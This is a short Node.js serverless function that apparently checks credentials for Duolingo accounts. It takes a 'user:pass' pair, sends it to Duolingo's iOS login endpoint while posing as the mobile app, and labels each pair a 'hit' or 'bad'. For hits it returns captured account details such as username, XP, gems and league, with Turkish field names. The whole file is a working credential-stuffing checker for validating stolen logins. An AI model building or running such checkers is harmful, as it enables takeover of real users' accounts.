const axios = require("axios");
const crypto = require("crypto");

module.exports = async (req, res) => {
  try {
    const account = req.query.account;
    if (!account || !account.includes(":")) {
      return res.status(400).json({ error: "Format: user:pass" });
    }

    const [username, password] = account.split(":");
    const distinctId = crypto.randomBytes(16).toString("hex");

    const response = await axios.post(
      "https://ios-api-2.duolingo.com/2023-05-23/login",
      {
        password,
        distinctId,
        identifier: username,
        fields:
          "username,level,totalXp,gems,num_followers,tier,currentCourse",
      },
      {
        timeout: 8000,
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "DuolingoMobile/7.41.0 (iPhone; iOS 18.0; Scale/2.00)",
        },
        validateStatus: () => true,
      }
    );

    const data = response.data || {};
    const cookies = response.headers["set-cookie"] || [];
    const cookieStr = cookies.join("; ");

    if (JSON.stringify(data).trim() === "{}") {
      return res.json({ result: "bad", captured: {} });
    }

    if (data.currentCourse && cookieStr.includes("jwt_token")) {
      const captured = {
        Kullanıcı: data.username || null,
        Seviye: data.level || null,
        XP: data.totalXp || null,
        Elmas: data.gems || null,
        Takipçi: data.num_followers || null,
        Lig: data.tier || null,
        Kurs: data.currentCourse || null,
      };

      return res.json({ result: "hit", captured });
    }

    return res.json({ result: "bad", captured: {} });
  } catch (err) {
    console.error("FUNCTION ERROR:", err);
    return res.status(500).json({ error: err.message });
  }
};
